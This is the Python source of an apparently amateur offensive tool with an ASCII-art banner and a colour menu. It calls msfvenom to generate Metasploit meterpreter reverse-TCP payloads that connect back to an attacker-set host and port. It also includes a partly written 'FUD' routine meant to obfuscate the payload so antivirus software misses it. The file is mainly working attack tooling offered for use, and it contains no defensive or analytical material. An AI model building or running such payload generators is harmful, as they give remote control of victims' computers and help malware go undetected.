#!/usr/bin/env python3
import colorama
import subprocess
import sys
import re 
import base64
#custom import 
import varsx 


banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')

lhost = varsx.lhost
lport = varsx.lport

def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls")

#For prntopt func
n = 1
def prntopt(texxt):  
    global n
    print(colorama.Fore.LIGHTBLUE_EX + "[" + str(n) + "] " + colorama.Fore.LIGHTYELLOW_EX + texxt + colorama.Style.RESET_ALL)
    n += 1   

def prntbannred(texxt):
    return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )

def inputc(texxt):
    print("\n")
    dvhdnhhg = input(colorama.Fore.LIGHTYELLOW_EX + str(texxt) + colorama.Fore.LIGHTGREEN_EX).strip()
    print(colorama.Style.RESET_ALL)  
    return dvhdnhhg

def lask():
    global lhost, lport
    lhostask = inputc("Enter Host leave empty for default (" + lhost + "): ")
    lportask = inputc("Enter Port leave empty for default (" + lport + "): ")
    if lhostask.strip() != '':
        lhost = lhostask
    if lportask.strip() != '':
        lport = lportask    
    print(colorama.Style.RESET_ALL)

def payloadgen1(payload, talkback, lhost, lport, outfile):
    subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    

def pythonpayload():
    global n, pyoutfile
    n = 1
    pyoutfile = varsx.pyoutfile
    #For copy pasting
    clearscreen()
    pyp = "python/meterpreter/reverse_"
    prntbannred("Python Payload Menu")
    prntopt("Create a simple python payload")
    prntopt("Create an obfistucated (FUD) python payload")
    inputpy = inputc("Option: ").strip()
    lask()
    inputpy2 = inputc("Enter file to save payload as. Leave empty for default: ")
    if inputpy2.strip() != "":
        pyoutfile = inputpy2
    #generate simple payload    
    if inputpy == "1":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", "tcp", lhost, lport, pyoutfile)
        print(colorama.Style.RESET_ALL)
    elif inputpy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", "tcp", lhost, lport, pyoutfile + ".tmp")    
        pythonpayloadfud()

def pythonpayloadfud():
    print("Making payload FUD...")
    pytempf = open(pyoutfile + ".tmp", "r")
    dat1 = pytempf.readline()
    #part of file b4 base64 code
    b4b64 = "getencoder('utf-8')('"
    #part of file after
    afb64 = "')[0]))"
    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
    pycode = base64.b64decode(b64pycode)
    

def menu():
    prntopt("Create a python payload (MSF)")
    prntopt("Create a windows payload (MSF)")
    prntopt("Create an android payload (MSF)")
    prntopt("Create an embedded android payload (MSF, Reverse TCP)")
    prntopt("Start the Metasploit Framework Console")
    input1 = inputc("Option: ")
    if input1 == "1":
        pythonpayload()
        
def main():
    clearscreen()
    print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
    menu()

main()



    




                                                               